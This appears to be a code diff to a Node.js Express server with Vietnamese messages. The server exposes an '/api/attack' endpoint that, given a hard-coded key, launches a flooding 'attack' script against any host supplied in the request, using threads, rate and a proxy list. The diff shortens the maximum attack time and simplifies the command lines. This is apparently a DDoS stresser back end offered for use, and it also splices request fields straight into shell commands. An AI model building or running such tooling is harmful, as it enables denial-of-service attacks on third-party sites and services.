@@ -10,7 +10,7 @@ let currentPID = null;
 const validateInput = ({ key, host, time, method, port }) => {
   if (![key, host, time, method, port].every(Boolean)) return "THIẾU THAM SỐ";
   if (key !== "negan") return "KEY KHÔNG HỢP LỆ";
-  if (time > 300) return "THỜI GIAN PHẢI < 300S";
+  if (time > 200) return "THỜI GIAN PHẢI < 200S";
   if (port < 1 || port > 65535) return "CỔNG KHÔNG HỢP LỆ";
   return null;
 };
@@ -40,7 +40,7 @@ const executeAttack = (command) => {
 
 const executeAllAttacks = (methods, host, time, threads, rate) => {
   const commands = methods.map((method) => {
-    return `node --max-old-space-size=65536 attack -m ${method} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
+    return `node attack -m ${method} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true`;
   });
 
   // Thực thi tất cả các lệnh tấn công song song mà không chờ kết quả
@@ -75,7 +75,7 @@ app.get("/api/attack", (req, res) => {
       pid: currentPID 
     });
   } else {
-    const command = `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
+    const command = `node attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true`;
     executeAttack(command);  // Chạy tấn công cho modul không phải FULL
     res.status(200).json({ 
       status: "SUCCESS", 
